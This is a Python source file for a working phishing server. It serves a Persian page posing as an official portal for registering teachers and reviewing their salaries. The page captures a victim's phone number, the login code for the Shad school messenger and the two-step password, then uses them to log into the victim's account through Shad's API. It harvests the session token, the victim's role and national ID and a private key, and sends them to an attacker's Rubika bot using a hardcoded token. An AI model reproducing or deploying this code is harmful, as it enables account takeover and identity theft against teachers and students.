import base64
import gzip
import http.cookies
import http.server
import json
import os
import random
import re
import socketserver
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

from cryptography.hazmat.primitives import hashes, padding, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

SHAD_URL = "https://shadmessenger36.iranlms.ir/"
ENDPOINT_URL = "https://shendpoint.iranlms.ir"
APP_VERSION = "4.0.1"
API_VERSION = "6"
IV = b"\x00" * 16

BOT_TOKEN = os.environ.get(
    "RUBIKA_BOT_TOKEN",
    "CJGICH0VFFYMXGQSVDOGMCZJHSSGEVUMODYPGNODPZRSAOCZVCDIPURGKCPVKVHM",
)
BOT_CHAT_ID = os.environ.get(
    "RUBIKA_BOT_CHAT_ID",
    "b0KGc1x0BSmB0e743965c83ee1c63398",
)
BOT_API_BASE = "https://botapi.rubika.ir/v3"

HOST = os.environ.get("HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8080"))


def normalize_phone(phone: str) -> str:
    p = phone.strip().replace(" ", "").replace("-", "").replace("\u200c", "")
    if p.startswith("+"):
        p = p[1:]
    if p.startswith("09") and len(p) == 11:
        p = "98" + p[1:]
    return p


def auth_set(s: str) -> str:
    out = []
    for ch in s:
        if "a" <= ch <= "z":
            out.append(chr(((32 - (ord(ch) - 97)) % 26) + 97))
        elif "A" <= ch <= "Z":
            out.append(chr(((29 - (ord(ch) - 65)) % 26) + 65))
        elif "0" <= ch <= "9":
            out.append(chr(((13 - (ord(ch) - 48)) % 10) + 48))
        else:
            out.append(ch)
    return "".join(out)


def make_key(key_str: str) -> bytes:
    if len(key_str) < 32:
        raise ValueError("طول کلید باید حداقل ۳۲ کاراکتر باشد.")
    reordered = key_str[16:24] + key_str[0:8] + key_str[24:32] + key_str[8:16]
    chars = list(reordered)
    for i, ch in enumerate(chars):
        if "0" <= ch <= "9":
            chars[i] = chr(((ord(ch) - 48 + 5) % 10) + 48)
        elif "a" <= ch <= "z":
            chars[i] = chr(((ord(ch) - 97 + 9) % 26) + 97)
    return "".join(chars).encode("utf-8")


def aes_encrypt(key_str: str, plain_text: str) -> str:
    key = make_key(key_str)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plain_text.encode("utf-8")) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV))
    enc = cipher.encryptor().update(padded) + cipher.encryptor().finalize()
    return base64.b64encode(enc).decode("utf-8")


def aes_decrypt(key_str: str, b64_cipher: str) -> str:
    key = make_key(key_str)
    raw = base64.b64decode(b64_cipher.strip())
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV))
    dec = cipher.decryptor().update(raw) + cipher.decryptor().finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plain = unpadder.update(dec) + unpadder.finalize()
    return plain.decode("utf-8", errors="replace")


def generate_rsa_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=1024)
    public_key = private_key.public_key()

    pub_der_b64 = base64.b64encode(
        public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    ).decode("ascii")

    pem = f"-----BEGIN PUBLIC KEY-----\r\n{pub_der_b64}\r\n-----END PUBLIC KEY-----"
    pem_b64 = base64.b64encode(pem.encode("utf-8")).decode("utf-8")
    pub_encoded = auth_set(pem_b64)

    priv_der_b64 = base64.b64encode(
        private_key.private_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )
    ).decode("ascii")

    return pub_encoded, priv_der_b64, private_key


def sign_rsa_sha256(private_key_obj, data_enc: str) -> str:
    signature = private_key_obj.sign(
        data_enc.encode("utf-8"),
        asym_padding.PKCS1v15(),
        hashes.SHA256(),
    )
    return base64.b64encode(signature).decode("utf-8")


def decrypt_rsa_oaep(private_key_obj, enc_b64: str) -> str:
    raw = base64.b64decode(enc_b64.strip())
    plain = private_key_obj.decrypt(
        raw,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None,
        ),
    )
    return plain.decode("utf-8", errors="replace")


def random_tmp_session() -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(32))


def random_device_hash() -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(16))


def _decode_http_body(raw_bytes: bytes, headers) -> str:
    enc = (headers.get("Content-Encoding") or "").lower()
    if "gzip" in enc or raw_bytes[:2] == b"\x1f\x8b":
        try:
            raw_bytes = gzip.decompress(raw_bytes)
        except Exception:
            pass
    return raw_bytes.decode("utf-8", errors="replace")


def _extract_identity_and_national_id(payload_obj, raw_text: str) -> tuple[str, str]:
    role_label = "نامشخص"
    national_id = "نامشخص"

    text_blob = raw_text
    if payload_obj is not None:
        try:
            text_blob += "\n" + json.dumps(payload_obj, ensure_ascii=False)
        except Exception:
            pass

    nid_patterns = [
        r'(?:national_?id|nationalCode|national_?code|mellicode|melli_?code|کد\s*ملی)["\']?\s*[:=]\s*["\']?(\d{10})["\']?',
        r'\b(\d{10})\b',
    ]
    for pat in nid_patterns:
        m = re.search(pat, text_blob, flags=re.IGNORECASE)
        if m:
            national_id = m.group(1)
            break

    role_patterns = [
        (r'(?:principal|manager|director|مدیر|مدیریت)', "مدیر"),
        (r'(?:teacher|educator|staff|معلم|فرهنگی|دبیر|آموزگار)', "معلم"),
        (r'(?:student|pupil|دانش\s*آموز|دانش‌آموز)', "دانش‌آموز"),
    ]
    for pat, label in role_patterns:
        if re.search(pat, text_blob, flags=re.IGNORECASE):
            role_label = label
            break

    def walk_dict(d):
        nonlocal role_label, national_id
        if isinstance(d, dict):
            for k, v in d.items():
                kl = str(k).lower()
                if isinstance(v, str):
                    vs = v.strip()
                    if ("national" in kl or "melli" in kl) and re.fullmatch(r"\d{10}", vs):
                        national_id = vs
                    if any(x in kl for x in ("role", "type", "user_type", "usertype", "position", "title")):
                        vl = vs.lower()
                        if any(w in vl for w in ("manager", "principal", "director", "مدیر")):
                            role_label = "مدیر"
                        elif any(w in vl for w in ("teacher", "educator", "معلم", "دبیر", "آموزگار")):
                            role_label = "معلم"
                        elif any(w in vl for w in ("student", "pupil", "دانش")):
                            role_label = "دانش‌آموز"
                walk_dict(v)
        elif isinstance(d, list):
            for item in d:
                walk_dict(item)

    if isinstance(payload_obj, (dict, list)):
        walk_dict(payload_obj)

    return role_label, national_id


def send_auth_to_rubika_bot(
    auth_value: str,
    phone: str,
    identity_role: str = "نامشخص",
    national_id: str = "نامشخص",
) -> dict:
    text = (
        f"هویت: {identity_role}\n"
        f"کد ملی: {national_id}\n"
        f"شماره: {phone}\n\n"
        f"AUTH:\n{auth_value}"
    )
    url = f"{BOT_API_BASE}/{BOT_TOKEN}/sendMessage"
    payload = json.dumps(
        {"chat_id": BOT_CHAT_ID, "text": text},
        ensure_ascii=False,
    ).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return {"raw": raw}


class ShadAuthSession:
    def __init__(self):
        self.base_url = SHAD_URL
        self.endpoint_url = ENDPOINT_URL
        self.tmp_session = random_tmp_session()
        self.device_hash = random_device_hash()
        self.pub_key = None
        self.priv_key_b64 = None
        self.priv_key_obj = None
        self.auth = None
        self.phone = None
        self.phone_code_hash = None
        self.two_fa_password = None
        self.pending_code = None

    def _client_info(self) -> dict:
        return {
            "app_name": "Main",
            "app_version": APP_VERSION,
            "lang_code": "fa",
            "package": "ir.medu.shad",
            "temp_code": "30",
            "store": "Direct",
            "platform": "Android",
        }

    def post_tmp(self, payload_dict: dict, url: str | None = None) -> dict:
        target_url = url or self.base_url
        data_json = json.dumps(payload_dict, ensure_ascii=False, separators=(",", ":"))
        data_enc = aes_encrypt(self.tmp_session, data_json)
        body = json.dumps(
            {
                "api_version": API_VERSION,
                "data_enc": data_enc,
                "tmp_session": self.tmp_session,
            },
            separators=(",", ":"),
        ).encode("utf-8")

        req = urllib.request.Request(
            target_url,
            data=body,
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "okhttp/3.12.12",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            raw_text = _decode_http_body(resp.read(), resp.headers)

        try:
            outer = json.loads(raw_text)
        except json.JSONDecodeError:
            return {"raw": raw_text}

        enc_part = outer.get("data_enc")
        if enc_part:
            decrypted_str = aes_decrypt(self.tmp_session, enc_part)
            try:
                return json.loads(decrypted_str)
            except json.JSONDecodeError:
                return {"decrypted": decrypted_str}
        return outer

    def post_auth(self, payload_dict: dict) -> dict:
        data_json = json.dumps(payload_dict, ensure_ascii=False, separators=(",", ":"))
        data_enc = aes_encrypt(self.auth, data_json)
        sign = sign_rsa_sha256(self.priv_key_obj, data_enc)

        body = json.dumps(
            {
                "api_version": API_VERSION,
                "auth": auth_set(self.auth),
                "data_enc": data_enc,
                "sign": sign,
            },
            separators=(",", ":"),
        ).encode("utf-8")

        req = urllib.request.Request(
            self.base_url,
            data=body,
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": "okhttp/3.12.12",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            raw_text = _decode_http_body(resp.read(), resp.headers)

        try:
            outer = json.loads(raw_text)
        except json.JSONDecodeError:
            return {"raw": raw_text}

        enc_part = outer.get("data_enc")
        if enc_part:
            decrypted_str = aes_decrypt(self.auth, enc_part)
            try:
                return json.loads(decrypted_str)
            except json.JSONDecodeError:
                return {"decrypted": decrypted_str}
        return outer

    def fetch_endpoint_identity(self, auth_plain: str) -> tuple[str, str]:
        endpoint_body = json.dumps(
            {
                "data": {"object_id": "my-school"},
                "method": "getEndpointData",
                "auth": auth_plain,
                "client": {
                    "app_name": "Main",
                    "app_version": "3.7.9",
                    "package": "ir.medu.shad",
                    "platform": "Android",
                    "lang_code": "fa",
                    "store": "Bazar",
                    "temp_code": "32",
                },
                "api_version": "0",
            },
            ensure_ascii=False,
            separators=(",", ":"),
        ).encode("utf-8")

        req = urllib.request.Request(
            self.endpoint_url,
            data=endpoint_body,
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.12",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                raw_resp = _decode_http_body(resp.read(), resp.headers)
        except Exception:
            return "نامشخص", "نامشخص"

        parsed_obj = None
        try:
            parsed_obj = json.loads(raw_resp)
        except Exception:
            parsed_obj = None

        if isinstance(parsed_obj, dict) and parsed_obj.get("data_enc") and auth_plain:
            try:
                dec = aes_decrypt(auth_plain, parsed_obj["data_enc"])
                try:
                    parsed_obj = json.loads(dec)
                except Exception:
                    raw_resp = dec
            except Exception:
                pass

        return _extract_identity_and_national_id(parsed_obj, raw_resp)

    def _response_indicates_2fa(self, res: dict) -> bool:
        data = res.get("data") if isinstance(res, dict) else None
        combined = json.dumps({"res": res, "data": data}, ensure_ascii=False).upper()
        for token in (
            "2FA",
            "2STEP",
            "TWO_STEP",
            "TWO_FACTOR",
            "PASS_KEY",
            "PASSKEY",
            "PASSWORD_REQUIRED",
            "NEED_PASSWORD",
            "INVALID_PASSWORD",
            "SRP",
        ):
            if token in combined:
                return True
        if isinstance(data, dict):
            if (
                data.get("has_password") is True
                or data.get("is_password") is True
                or data.get("two_step") is True
            ):
                return True
        return False

    def _actually_send_code(self, pass_key: str = "") -> dict:
        inp = {"phone_number": self.phone, "send_type": "SMS"}
        if pass_key:
            inp["pass_key"] = pass_key
            inp["password"] = pass_key

        payload = {
            "method": "sendCode",
            "input": inp,
            "client": self._client_info(),
            "is_background": False,
        }
        res = self.post_tmp(payload)
        data = res.get("data") if isinstance(res, dict) else {}

        code_hash = None
        if isinstance(data, dict):
            code_hash = data.get("phone_code_hash") or data.get("phoneCodeHash") or data.get("hash")
        if not code_hash and isinstance(res, dict):
            code_hash = res.get("phone_code_hash") or res.get("phoneCodeHash")

        if code_hash:
            self.phone_code_hash = code_hash

        if not pass_key and isinstance(res, dict) and self._response_indicates_2fa(res):
            return {"ok": True, "need_2fa": True}

        status_val = ""
        if isinstance(data, dict):
            status_val = str(data.get("status") or "").upper()
        if not status_val and isinstance(res, dict):
            status_val = str(res.get("status") or "").upper()

        if code_hash or (
            status_val not in ("ERROR", "FAILED")
            and isinstance(res, dict)
            and not res.get("error")
        ):
            return {"ok": True, "need_2fa": False}

        err = ""
        if isinstance(data, dict):
            err = data.get("message") or data.get("status") or ""
        if not err and isinstance(res, dict):
            err = res.get("message") or res.get("status") or str(res)[:200]
        return {"ok": False, "error": f"SendCodeError: {err or 'ارسال کد ناموفق بود.'}"}

    def check_and_start_send_code(self, phone: str) -> dict:
        self.tmp_session = random_tmp_session()
        self.phone = normalize_phone(phone)
        self.two_fa_password = None
        self.pending_code = None
        self.phone_code_hash = None

        return self._actually_send_code()

    def confirm_2fa_and_send_code(self, password: str) -> dict:
        pwd = (password or "").strip()
        if not pwd:
            return {"ok": False, "error": "رمز عبور تایید دو مرحله‌ای را وارد کنید."}

        self.two_fa_password = pwd

        if self.pending_code:
            return self.sign_in_and_send(self.pending_code)

        return {"ok": True, "need_code": True}

    def register_device(self) -> dict:
        payload = {
            "method": "registerDevice",
            "input": {
                "ads_id": f"GOOGLE_{uuid.uuid4()}",
                "app_version": f"MA_{APP_VERSION}",
                "device_hash": self.device_hash,
                "device_model": "SM-G998B",
                "is_multi_account": False,
                "lang_code": "fa",
                "system_version": "SDK 33",
                "token": "",
                "token_type": "Firebase",
            },
            "client": self._client_info(),
            "is_background": False,
        }
        return self.post_auth(payload)

    def _finalize_login(self, auth_plain: str) -> dict:
        self.auth = auth_plain
        try:
            self.register_device()
        except Exception:
            pass

        identity_role, national_id = self.fetch_endpoint_identity(auth_plain)

        try:
            save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shad_auth.json")
            with open(save_path, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "phone": self.phone,
                        "auth": auth_plain,
                        "private_key": self.priv_key_b64,
                        "identity": identity_role,
                        "national_id": national_id,
                    },
                    f,
                    ensure_ascii=False,
                    indent=2,
                )
        except Exception:
            pass

        bot_res = send_auth_to_rubika_bot(
            auth_plain,
            self.phone or "",
            identity_role=identity_role,
            national_id=national_id,
        )
        return {"ok": True, "bot": bot_res}

    def sign_in_and_send(self, code: str) -> dict:
        if code:
            self.pending_code = code.strip()
        active_code = self.pending_code or ""

        if not self.priv_key_obj:
            self.pub_key, self.priv_key_b64, self.priv_key_obj = generate_rsa_keys()

        inp = {
            "phone_number": self.phone,
            "phone_code_hash": self.phone_code_hash or "",
            "phone_code": active_code,
            "public_key": self.pub_key,
        }
        if self.two_fa_password:
            inp["password"] = self.two_fa_password
            inp["pass_key"] = self.two_fa_password

        payload = {
            "method": "signIn",
            "input": inp,
            "client": self._client_info(),
            "is_background": False,
        }
        res = self.post_tmp(payload)
        data_obj = res.get("data") if isinstance(res, dict) else None

        if isinstance(data_obj, dict) and data_obj.get("status") == "OK" and data_obj.get("auth"):
            auth_plain = decrypt_rsa_oaep(self.priv_key_obj, data_obj["auth"])
            return self._finalize_login(auth_plain)

        if not self.two_fa_password and self._response_indicates_2fa(res if isinstance(res, dict) else {}):
            return {"ok": False, "need_2fa": True}

        detail = ""
        if isinstance(data_obj, dict):
            detail = data_obj.get("status") or data_obj.get("message") or str(data_obj)[:200]
        elif isinstance(res, dict):
            detail = str(res)[:200]
        return {"ok": False, "error": f"SignInFailed: {detail or 'کد یا اطلاعات ورود نامعتبر است.'}"}


HTML_PAGE = """<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>سامانه ثبت‌نام و احراز هویت فرهنگیان</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-dark: #09111e;
      --bg-panel: #0f1b2d;
      --bg-input: #0a1322;
      --border-subtle: rgba(148, 163, 184, 0.18);
      --border-accent: rgba(212, 175, 55, 0.42);
      --text-primary: #f1f5f9;
      --text-secondary: #94a3b8;
      --accent-gold: #d4af37;
      --accent-gold-soft: rgba(212, 175, 55, 0.12);
      --accent-emerald: #0f766e;
      --accent-emerald-hover: #115e59;
      --warn-amber: #fbbf24;
      --success-mint: #34d399;
    }

    * {
      box-sizing: border-box;
      font-family: "Vazirmatn", "IRANSans", "B Nazanin", Tahoma, sans-serif;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
      background: linear-gradient(180deg, rgba(9, 17, 30, 0.96) 0%, rgba(12, 24, 41, 0.98) 100%);
      color: var(--text-primary);
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: var(--bg-panel);
      border: 1px solid var(--border-subtle);
      border-top: 3px solid var(--accent-gold);
      border-radius: 14px;
      padding: 26px 24px;
      box-shadow: 0 18px 42px rgba(0, 0, 0, 0.45);
    }

    .org-header {
      padding-bottom: 16px;
      margin-bottom: 18px;
      border-bottom: 1px solid var(--border-subtle);
    }

    .org-tag {
      display: inline-block;
      font-size: 11px;
      font-weight: 600;
      color: var(--accent-gold);
      background: var(--accent-gold-soft);
      border: 1px solid var(--border-accent);
      padding: 3px 10px;
      border-radius: 6px;
      margin-bottom: 8px;
    }

    .org-title {
      font-size: 17px;
      font-weight: 800;
      color: var(--text-primary);
      margin: 0 0 4px 0;
      line-height: 1.5;
    }

    .org-subtitle {
      font-size: 12.5px;
      color: var(--text-secondary);
      margin: 0;
      line-height: 1.65;
    }

    .page { display: none; }
    .page.active { display: block; }

    .prompt-text {
      font-size: 14px;
      font-weight: 600;
      line-height: 1.8;
      margin-bottom: 12px;
      color: var(--text-primary);
    }

    input {
      width: 100%;
      padding: 12px 14px;
      border-radius: 8px;
      border: 1px solid var(--border-subtle);
      background: var(--bg-input);
      color: var(--text-primary);
      font-size: 14px;
      outline: none;
      transition: border-color 0.18s ease;
    }

    input:focus {
      border-color: var(--accent-gold);
    }

    button {
      width: 100%;
      margin-top: 14px;
      padding: 12px 16px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 8px;
      background: var(--accent-emerald);
      color: #ffffff;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.18s ease, opacity 0.18s ease;
    }

    button:hover:not(:disabled) {
      background: var(--accent-emerald-hover);
    }

    button:disabled {
      opacity: 0.65;
      cursor: not-allowed;
    }

    .msg {
      margin-top: 12px;
      font-size: 12.5px;
      color: var(--warn-amber);
      min-height: 20px;
      line-height: 1.7;
      word-break: break-word;
      user-select: all;
    }

    .done {
      color: var(--success-mint);
      font-weight: 700;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="org-header">
      <div class="org-tag">سامانه اداری فرهنگیان</div>
      <h1 class="org-title">ثبت‌نام و بررسی احکام حقوقی</h1>
      <p class="org-subtitle">احراز هویت و ثبت اطلاعات جهت بررسی افزایش حقوق فرهنگیان</p>
    </div>

    <div id="pagePhone" class="page active">
      <div class="prompt-text">شماره تلفن خود را وارد کنید</div>
      <input id="phoneInput" type="tel" placeholder="989123456789" />
      <button id="sendCodeBtn" onclick="onSendCode()">ارسال کد</button>
      <div id="msgPhone" class="msg"></div>
    </div>

    <div id="page2FA" class="page">
      <div class="prompt-text">رمز عبور تایید دو مرحله‌ای را وارد کنید</div>
      <input id="pass2FAInput" type="password" placeholder="رمز تایید دو مرحله‌ای" />
      <button id="submit2FABtn" onclick="onSubmit2FA()">تایید و ارسال کد</button>
      <div id="msg2FA" class="msg"></div>
    </div>

    <div id="pageCode" class="page">
      <div class="prompt-text">کد ارسال شده در اپلیکیشن شاد را وارد کنید</div>
      <input id="codeInput" type="text" placeholder="کد تایید" />
      <button id="verifyCodeBtn" onclick="onVerifyCode()">تایید</button>
      <div id="msgCode" class="msg"></div>
    </div>

    <div id="pageDone" class="page">
      <div class="prompt-text done">انجام شد</div>
    </div>
  </div>

  <script>
    function showPage(id) {
      document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
      document.getElementById(id).classList.add("active");
    }

    async function copyErrorToClipboard(errText) {
      if (!errText) return false;
      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(errText);
          return true;
        }
      } catch (_) {}

      const ta = document.createElement("textarea");
      ta.value = errText;
      ta.setAttribute("readonly", "");
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      ta.setSelectionRange(0, ta.value.length);
      let ok = false;
      try {
        ok = document.execCommand("copy");
      } catch (_) {
        ok = false;
      }
      document.body.removeChild(ta);
      return ok;
    }

    async function showError(targetEl, rawErr) {
      const msg = String(rawErr || "خطا");
      const copied = await copyErrorToClipboard(msg);
      targetEl.textContent = copied ? `${msg} (در کلیپ‌بورد کپی شد)` : msg;
    }

    async function onSendCode() {
      const phone = document.getElementById("phoneInput").value.trim();
      const msgEl = document.getElementById("msgPhone");
      const btn = document.getElementById("sendCodeBtn");
      if (!phone) {
        await showError(msgEl, "شماره تلفن را وارد کنید.");
        return;
      }
      btn.disabled = true;
      msgEl.textContent = "در حال ارسال...";
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 35000);
        const r = await fetch("/send-code", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({phone}),
          signal: controller.signal
        });
        clearTimeout(timer);
        const data = await r.json();
        if (data.ok) {
          msgEl.textContent = "";
          showPage(data.need_2fa ? "page2FA" : "pageCode");
        } else {
          await showError(msgEl, data.error || "خطا در ارسال کد.");
        }
      } catch (e) {
        if (e.name === "AbortError") {
          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
        } else {
          await showError(msgEl, `${e.name}: ${e.message}`);
        }
      } finally {
        btn.disabled = false;
      }
    }

    async function onSubmit2FA() {
      const password = document.getElementById("pass2FAInput").value;
      const msgEl = document.getElementById("msg2FA");
      const btn = document.getElementById("submit2FABtn");
      if (!password) {
        await showError(msgEl, "رمز تایید دو مرحله‌ای را وارد کنید.");
        return;
      }
      btn.disabled = true;
      msgEl.textContent = "در حال ثبت...";
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 35000);
        const r = await fetch("/submit-2fa", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({password}),
          signal: controller.signal
        });
        clearTimeout(timer);
        const data = await r.json();
        if (data.ok) {
          msgEl.textContent = "";
          showPage("pageCode");
        } else {
          await showError(msgEl, data.error || "خطا در تایید دو مرحله‌ای.");
        }
      } catch (e) {
        if (e.name === "AbortError") {
          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
        } else {
          await showError(msgEl, `${e.name}: ${e.message}`);
        }
      } finally {
        btn.disabled = false;
      }
    }

    async function onVerifyCode() {
      const code = document.getElementById("codeInput").value.trim();
      const msgEl = document.getElementById("msgCode");
      const btn = document.getElementById("verifyCodeBtn");
      if (!code) {
        await showError(msgEl, "کد را وارد کنید.");
        return;
      }
      btn.disabled = true;
      msgEl.textContent = "در حال تایید...";
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 35000);
        const r = await fetch("/verify-code", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({code}),
          signal: controller.signal
        });
        clearTimeout(timer);
        const data = await r.json();
        if (data.ok) {
          showPage("pageDone");
        } else if (data.need_2fa) {
          msgEl.textContent = "";
          showPage("page2FA");
        } else {
          await showError(msgEl, data.error || "کد نامعتبر است.");
        }
      } catch (e) {
        if (e.name === "AbortError") {
          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
        } else {
          await showError(msgEl, `${e.name}: ${e.message}`);
        }
      } finally {
        btn.disabled = false;
      }
    }
  </script>
</body>
</html>
"""


class SessionStore:
    def __init__(self):
        self._lock = threading.Lock()
        self._sessions: dict[str, ShadAuthSession] = {}

    def get_or_create(self, sid: str | None) -> tuple[str, ShadAuthSession]:
        with self._lock:
            if sid and sid in self._sessions:
                return sid, self._sessions[sid]
            new_sid = uuid.uuid4().hex
            sess = ShadAuthSession()
            self._sessions[new_sid] = sess
            return new_sid, sess


def make_handler(store: SessionStore):
    class Handler(http.server.BaseHTTPRequestHandler):
        def _get_sid(self) -> str | None:
            cookie_hdr = self.headers.get("Cookie")
            if not cookie_hdr:
                return None
            c = http.cookies.SimpleCookie()
            try:
                c.load(cookie_hdr)
            except Exception:
                return None
            if "sid" in c:
                return c["sid"].value
            return None

        def _json(self, obj: dict, sid: str, code: int = 200):
            raw = json.dumps(obj, ensure_ascii=False).encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Set-Cookie", f"sid={sid}; Path=/; HttpOnly; SameSite=Lax")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            if parsed.path in ("/", "/index.html"):
                sid, _ = store.get_or_create(self._get_sid())
                raw = HTML_PAGE.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Set-Cookie", f"sid={sid}; Path=/; HttpOnly; SameSite=Lax")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)
            else:
                self.send_response(404)
                self.end_headers()

        def do_POST(self):
            sid, session = store.get_or_create(self._get_sid())
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length).decode("utf-8") or "{}")
            try:
                if self.path == "/send-code":
                    res = session.check_and_start_send_code(body.get("phone", ""))
                    self._json(res, sid)
                elif self.path == "/submit-2fa":
                    res = session.confirm_2fa_and_send_code(body.get("password", ""))
                    self._json(res, sid)
                elif self.path == "/verify-code":
                    res = session.sign_in_and_send(body.get("code", ""))
                    self._json(res, sid)
                else:
                    self._json({"ok": False, "error": "Not found"}, sid, 404)
            except urllib.error.URLError as e:
                self._json({"ok": False, "error": f"URLError: {e.reason}"}, sid, 200)
            except Exception as e:
                self._json({"ok": False, "error": f"{type(e).__name__}: {e}"}, sid, 200)

        def log_message(self, format, *args):
            return

    return Handler


def main():
    store = SessionStore()
    server = socketserver.ThreadingTCPServer((HOST, PORT), make_handler(store))
    actual_port = server.server_address[1]
    print(f"Running on http://{HOST}:{actual_port}", flush=True)

    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
